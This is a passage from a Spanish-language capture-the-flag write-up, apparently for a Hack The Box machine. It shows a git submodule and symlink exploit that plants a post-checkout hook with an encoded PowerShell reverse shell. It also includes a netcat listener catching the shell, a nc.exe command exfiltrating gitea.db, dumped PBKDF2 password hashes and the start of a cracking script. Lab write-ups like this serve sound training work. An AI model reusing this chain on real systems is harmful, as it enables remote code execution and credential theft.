+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22:21:24.079142 IP 10.129.255.250 &gt; 10.10.14.71: ICMP echo request, id 1, seq 1, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:24.079166 IP 10.10.14.71 &gt; 10.129.255.250: ICMP echo reply, id 1, seq 1, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:25.088732 IP 10.129.255.250 &gt; 10.10.14.71: ICMP echo request, id 1, seq 2, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:25.088755 IP 10.10.14.71 &gt; 10.129.255.250: ICMP echo reply, id 1, seq 2, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:26.092072 IP 10.129.255.250 &gt; 10.10.14.71: ICMP echo request, id 1, seq 3, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:26.092092 IP 10.10.14.71 &gt; 10.129.255.250: ICMP echo reply, id 1, seq 3, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:27.094250 IP 10.129.255.250 &gt; 10.10.14.71: ICMP echo request, id 1, seq 4, length <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>22:21:27.094269 IP 10.10.14.71 &gt; 10.129.255.250: ICMP echo reply, id 1, seq 4, length <span style="color:#ae81ff">40</span>
+</span></span></code></pre></div><p>Ahora voy a crear de nuevo los repositorios y vamos a modificar el script para establecernos una reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>git config --global protocol.file.allow always
+</span></span><span style="display:flex;"><span>git config --global core.symlinks true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hook_repo_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.255.250:3000/pointedsec/hook.git&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git clone <span style="color:#e6db74">&#34;</span>$hook_repo_path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>cd hook
+</span></span><span style="display:flex;"><span>mkdir -p y/hooks
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt; y/hooks/post-checkout <span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ping 10.10.14.71
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x y/hooks/post-checkout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git add y/hooks/post-checkout
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;post-checkout&#34;</span>
+</span></span><span style="display:flex;"><span>git push
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>incredibol_repo_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.129.255.250:3000/pointedsec/incredibol.git&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git clone <span style="color:#e6db74">&#34;</span>$incredibol_repo_path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>cd incredibol
+</span></span><span style="display:flex;"><span>git submodule add --name x/y <span style="color:#e6db74">&#34;</span>$hook_repo_path<span style="color:#e6db74">&#34;</span> A/modules/x
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;add-submodule&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;.git&#34;</span> &gt; dotgit.txt
+</span></span><span style="display:flex;"><span>git hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hash
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;120000 %s 0\ta\n&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat dot-git.hash<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; index.info
+</span></span><span style="display:flex;"><span>git update-index --index-info &lt; index.info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>git commit -m <span style="color:#e6db74">&#34;add-symlink&#34;</span>
+</span></span><span style="display:flex;"><span>git push
+</span></span></code></pre></div><p>Ahora si pasamos el repositorio a la aplicación&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.71<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.255.250<span style="color:#f92672">]</span> <span style="color:#ae81ff">51683</span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>ichard<span style="color:#ae81ff">\s</span>ource<span style="color:#ae81ff">\c</span>loned_repos<span style="color:#ae81ff">\u</span>1our<span style="color:#ae81ff">\.</span>git<span style="color:#ae81ff">\m</span>odules<span style="color:#ae81ff">\x</span>&gt; whoami
+</span></span><span style="display:flex;"><span>Richard
+</span></span></code></pre></div><p>En el directorio <code>Documents</code> de Richard, podemos ver el script utilizado para clonar los repositorios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the file containing repository URLs</span>
+</span></span><span style="display:flex;"><span>repos_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:/Users/Richard/source/repos/repos.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify the path where you want to clone the repositories</span>
+</span></span><span style="display:flex;"><span>clone_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:/Users/Richard/source/cloned_repos&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the file exists</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> ! -f <span style="color:#e6db74">&#34;</span>$repos_file<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Error: Repositories file </span>$repos_file<span style="color:#e6db74"> not found.&#34;</span>
+</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create the clone path if it doesn&#39;t exist</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$clone_path<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop through each repository URL in the file and clone it</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -r repo_url; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>repo_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        repo_name<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>head /dev/urandom | tr -dc a-z0-9 | head -c 5<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Cloning repository: </span>$repo_url<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        git clone --recursive <span style="color:#e6db74">&#34;</span>$repo_url<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$clone_path<span style="color:#e6db74">/</span>$repo_name<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Repository cloned.&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; <span style="color:#e6db74">&#34;</span>$repos_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo -n &gt; <span style="color:#e6db74">&#34;</span>$repos_file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;All repositories cloned successfully to </span>$clone_path<span style="color:#e6db74">.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Cleanup Section</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define the folder path</span>
+</span></span><span style="display:flex;"><span>folderPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:/Users/Richard/source/cloned_repos&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the folder exists</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -d <span style="color:#e6db74">&#34;</span>$folderPath<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Deleting contents of </span>$folderPath<span style="color:#e6db74">...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Delete all files in the folder</span>
+</span></span><span style="display:flex;"><span>  find <span style="color:#e6db74">&#34;</span>$folderPath<span style="color:#e6db74">&#34;</span> -mindepth <span style="color:#ae81ff">1</span> -type f -delete
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Delete all directories and subdirectories in the folder</span>
+</span></span><span style="display:flex;"><span>  find <span style="color:#e6db74">&#34;</span>$folderPath<span style="color:#e6db74">&#34;</span> -mindepth <span style="color:#ae81ff">1</span> -type d -exec rm -rf <span style="color:#f92672">{}</span> +
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Contents of </span>$folderPath<span style="color:#e6db74"> have been deleted.&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Folder </span>$folderPath<span style="color:#e6db74"> not found.&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
+</span></span></code></pre></div><p>Y podemos ver que a la hora de clonar el repositorio, se utiliza el <code>--recursive</code> que es lo que nos habilita hacer esta explotación.</p>
+<h1 id="user-pivoting--emily">User Pivoting | Emily</h1>
+<p>Primero nos damos cuenta de que no está la flag en el directorio personal de trabajo de <code>Richard</code>
+Enumerando usuarios nos damos cuenta de la existencia de un usuario llamado <code>Emily</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Windows\Temp\work&gt; net user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> \\COMPILED
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator            DefaultAccount           Emily                    
+</span></span><span style="display:flex;"><span>Invitado                 Richard                  WDAGUtilityAccount
+</span></span></code></pre></div><p>Enumerando un poco la máquina, vemos que en el directorio <code>Program Files</code> está el <code>Gitea</code></p>
+<p>En el directorio <code>data</code> encontramos un archivo <code>gitea.db</code></p>
+<p>Me voy a compartir el <code>netcat</code> y me paso este archivo a mi máquina.</p>
+<p><code>PS C:\Windows\Temp\work&gt; cmd /c &quot;.\nc.exe 10.10.14.71 443 &lt; gitea.db&quot;</code></p>
+<p>Y al analizar la base de datos nos encontramos esto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>sqlite<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span>administrator<span style="color:#f92672">|</span>administrator<span style="color:#f92672">||</span>administrator<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span>enabled<span style="color:#f92672">|</span><span style="color:#ae81ff">1</span>bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d<span style="color:#f92672">|</span>pbkdf2$50000$50<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|||</span><span style="color:#ae81ff">6</span>e1a6f3adbe7eab92978627431fd2984<span style="color:#f92672">|</span>a45c43d36dce3076158b19c2c696ef7b<span style="color:#f92672">|</span>en<span style="color:#f92672">-</span>US<span style="color:#f92672">||</span><span style="color:#ae81ff">1716401383</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1716669640</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1716669640</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>administrator<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>arc<span style="color:#f92672">-</span>green<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span><span style="color:#f92672">|</span>richard<span style="color:#f92672">|</span>richard<span style="color:#f92672">||</span>richard<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span>enabled<span style="color:#f92672">|</span><span style="color:#ae81ff">4</span>b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e<span style="color:#f92672">|</span>pbkdf2$50000$50<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|||</span><span style="color:#ae81ff">2</span>be54ff86f147c6cb9b55c8061d82d03<span style="color:#f92672">|</span>d7cf2c96277dd16d95ed5c33bb524b62<span style="color:#f92672">|</span>en<span style="color:#f92672">-</span>US<span style="color:#f92672">||</span><span style="color:#ae81ff">1716401466</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1720089561</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1720089548</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>richard<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">2</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>arc<span style="color:#f92672">-</span>green<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span><span style="color:#f92672">|</span>emily<span style="color:#f92672">|</span>emily<span style="color:#f92672">||</span>emily<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span>enabled<span style="color:#f92672">|</span><span style="color:#ae81ff">97907280</span>dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16<span style="color:#f92672">|</span>pbkdf2$50000$50<span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|||</span><span style="color:#ae81ff">0056552</span>f6f2df0015762a4419b0748de<span style="color:#f92672">|</span><span style="color:#ae81ff">227</span>d873cca89103cd83a976bdac52486<span style="color:#f92672">|||</span><span style="color:#ae81ff">1716565398</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1716567763</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>emily<span style="color:#f92672">@</span>compiled.htb<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">2</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>arc<span style="color:#f92672">-</span>green<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span><span style="color:#f92672">|</span>pointedsec<span style="color:#f92672">|</span>pointedsec<span style="color:#f92672">||</span>pointedsec<span style="color:#f92672">@</span>pointed.com<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span>enabled<span style="color:#f92672">|</span><span style="color:#ae81ff">9</span>e8b5c3188f2affd979da0985ca3f65b0b7b9b920283a2f1583d81653314beec03963da08e164a1bace8b21a74c1d15d7511<span style="color:#f92672">|</span>pbkdf2$50000$50<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|||</span><span style="color:#ae81ff">4641</span>ac98587ae4fae05fe9b588034b66<span style="color:#f92672">|</span>bdafe008c0a70c14d790894bc68547ff<span style="color:#f92672">|</span>en<span style="color:#f92672">-</span>US<span style="color:#f92672">||</span><span style="color:#ae81ff">1722361346</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1722366996</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1722361346</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>pointedsec<span style="color:#f92672">@</span>pointed.com<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">3</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span><span style="color:#ae81ff">0</span><span style="color:#f92672">|</span>unified<span style="color:#f92672">|</span>arc<span style="color:#f92672">-</span>green<span style="color:#f92672">|</span><span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Existe el usuario <code>emily</code> y tenemos un hash <code>pbkdf2</code></p>
+<p>Para crackear este hash, tenemos que diferenciar los diferentes campos que se utilizan para encriptar la contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>sqlite<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> name, passwd, rands, salt  <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily&#34;</span>;
+</span></span><span style="display:flex;"><span>emily<span style="color:#f92672">|</span><span style="color:#ae81ff">97907280</span>dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16<span style="color:#f92672">|</span><span style="color:#ae81ff">0056552</span>f6f2df0015762a4419b0748de<span style="color:#f92672">|</span><span style="color:#ae81ff">227</span>d873cca89103cd83a976bdac52486
+</span></span></code></pre></div><p>Tras un rato intentando crackear los hashes obtenidos con <code>hashcat</code> me ha resultado imposible, y después de enumerar mas a fondo la máquina víctima, no me quedaba otra que seguir intentando crackear el hash, preferiblemente el de <code>emily</code>  ya que al ser un CTF, lo mas probable es que la manera intencionada de completar la máquina sea haciendo un pivoting a este usuario.</p>
+<p>Después de estudiar como funcionan este tipo de hashes, hice un script en python para crackear este hash.</p>
+<p>Antes de dejar el script por aquí, hay que tener en cuenta el valor dklen que también es importante. Este valor es 50. Después del script explico todo mas detalladamente.</p>
+<p><code>pbkdf2$50000$50</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;227d873cca89103cd83a976bdac52486&#34;</span> <span style="color:#75715e"># Este salt está en hexadecimal</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16&#34;</span>
+</span></span><span style="display:flex;"><span>real_hashed_pwd <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>salt<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
